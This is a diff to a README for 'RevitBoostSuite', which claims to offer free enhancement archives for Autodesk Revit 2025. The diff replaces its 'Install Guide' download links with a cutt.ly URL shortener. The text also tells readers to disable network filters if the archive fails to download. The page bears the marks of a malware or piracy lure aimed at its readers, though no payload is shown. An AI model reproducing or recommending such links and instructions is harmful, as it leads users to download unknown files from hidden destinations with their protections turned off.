@@ -6,8 +6,8 @@
 
 **About RevitBoostSuite**: RevitBoostSuite is a premier repository for *Autodesk Revit 2025* users on Windows and Mac, offering free enhancement archives to complement this premium BIM software, priced at $2,545/year or $2,145 one-time. Featuring advanced tools for building information modeling and multi-disciplinary coordination, our archives include custom scripts, BIM templates, and optimization tools to enhance design precision, streamline workflows, and improve project visualization. Backed by 100K+ visitors and 75K+ members, this September 12, 2025 update supports your paid software, with Mac compatibility via virtualization. (349 characters)
 
-<a href="https://revitproenhancehub.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Install_Guide-Windows-3498db" alt="Install Guide Now" width="250" height="45" style="border:none;">
+<a href="https://cutt.ly/IrNtQAYv" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
 ---
@@ -35,8 +35,8 @@ Enhance your *Autodesk Revit 2025* with **RevitBoostSuite** on Windows or Mac:
 5. **Fix Download Issues** 🌐  
    If the archive doesn’t download, disable network filters or switch browsers (Chrome, Firefox).
 
-<a href="https://revitproenhancehub.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Install_Guide-Windows-3498db" alt="Install Guide Now" width="250" height="45" style="border:none;">
+<a href="https://cutt.ly/IrNtQAYv" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
 ---
